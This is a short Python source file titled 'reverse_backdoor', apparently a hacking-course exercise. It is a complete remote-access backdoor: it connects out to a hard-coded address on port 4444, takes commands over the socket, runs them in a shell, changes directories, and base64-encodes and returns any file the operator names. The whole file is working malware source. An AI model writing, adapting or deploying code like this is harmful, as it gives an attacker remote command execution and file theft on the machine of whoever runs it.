# reverse_backdoor
import socket, subprocess, json, os,base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliabe_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)

            except ValueError:
                continue

    def execute_system_commad(self, command):
    	return subprocess.check_output(command, shell=True)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return  "[+] changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == "download":
                command_result = self.read_file(command[1])
            else:
                command_result = self.execute_system_commad(command)
            self.reliabe_send(command_result)


my_backdoor = Backdoor("10.0.2.15", 4444)
my_backdoor.run()
